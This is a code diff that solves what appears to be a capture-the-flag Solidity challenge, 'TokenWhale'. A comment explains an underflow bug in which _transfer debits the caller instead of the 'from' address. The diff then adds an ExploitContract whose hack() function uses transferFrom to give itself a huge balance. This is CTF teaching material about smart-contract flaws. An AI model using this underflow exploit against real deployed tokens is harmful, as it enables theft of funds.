@@ -40,11 +40,7 @@ contract TokenWhale {
         _transfer(to, value);
     }
 
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
+    event Approval(address indexed owner, address indexed spender, uint256 value);
 
     function approve(address spender, uint256 value) public {
         allowance[msg.sender][spender] = value;
@@ -61,7 +57,10 @@ contract TokenWhale {
     }
 }
 
-// Write your exploit contract below
+// In this challenge, the TokenWhale contract harbored a critical vulnerability within its _transfer internal overflow allowing for an overflow exploit.
+// the player granting the ExploitContract permission to transfer tokens, a flaw occurred when the transferFrom function
+// internally called _transfer. Instead of reducing the balance of the 'from' address, the function
+// reduced the balance of msg.sender (the ExploitContract), which was already zero. triggered an overflow condition. Resulting in setting balance of ExploitContract to large number.
 contract ExploitContract {
     TokenWhale public tokenWhale;
 
@@ -69,5 +68,8 @@ contract ExploitContract {
         tokenWhale = _tokenWhale;
     }
 
-    // write your exploit functions below
+    function hack(address from, address to, uint256 value) external {
+        tokenWhale.transferFrom(from, to, value);
+        tokenWhale.transfer(from, 1000000);
+    }
 }
